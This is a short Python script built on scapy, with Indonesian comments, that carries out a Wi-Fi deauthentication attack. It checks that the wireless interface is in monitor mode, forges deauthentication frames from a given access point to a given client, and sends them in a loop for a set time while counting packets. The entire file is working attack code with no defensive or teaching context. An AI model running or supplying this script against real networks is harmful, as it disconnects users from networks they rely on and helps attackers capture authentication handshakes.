import scapy.all as scapy
import time
import logging
import os

log = logging.getLogger(__name__)

def attack(bssid, client, iface, duration=60):

    # Cek apakah interface dalam monitor mode
    try:
        iwconfig_output = os.popen(f"iwconfig {iface}").read()
        if "Monitor" not in iwconfig_output:
            log.error(f"Interface {iface} is not in monitor mode. Please set it to monitor mode first.")
            return
    except Exception as e:
        log.error(f"Error checking interface mode: {e}")
        return


    # Buat paket deauthentication
    dot11 = scapy.Dot11(addr1=client, addr2=bssid, addr3=bssid)
    packet = scapy.RadioTap()/dot11/scapy.Dot11Deauth(reason=7)

    # Kirim paket secara berulang
    start_time = time.time()
    end_time = start_time + duration
    packets_sent = 0
    try:
      while time.time() < end_time:
          scapy.sendp(packet, iface=iface, verbose=False)
          packets_sent +=1
    except KeyboardInterrupt:
      pass
    except Exception as e:
      log.exception(f"Error: {e}")
    finally:
        log.info(f"Deauthentication attack finished. Sent {packets_sent} packets")